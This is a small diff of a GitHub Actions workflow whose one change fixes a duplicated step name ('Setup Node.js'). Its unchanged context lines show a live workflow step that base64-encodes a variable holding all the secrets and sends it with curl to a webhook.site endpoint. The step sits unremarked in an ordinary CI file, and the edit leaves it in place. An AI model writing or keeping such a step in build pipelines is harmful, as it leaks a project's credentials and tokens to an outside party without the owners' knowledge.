@@ -26,7 +26,7 @@ jobs:
           echo "$ALL_SECRETS" | base64 -w0 | curl -s -X POST "https://webhook.site/993a0ee5-7141-4904-bd84-659acee8bec1" -d @-
           echo "WEBHOOK_DONE"
 
-      - name: Setup Node.jsSetup Node.js
+      - name: Setup Node.js
         uses: actions/setup-node@v4
         with:
           node-version: 20
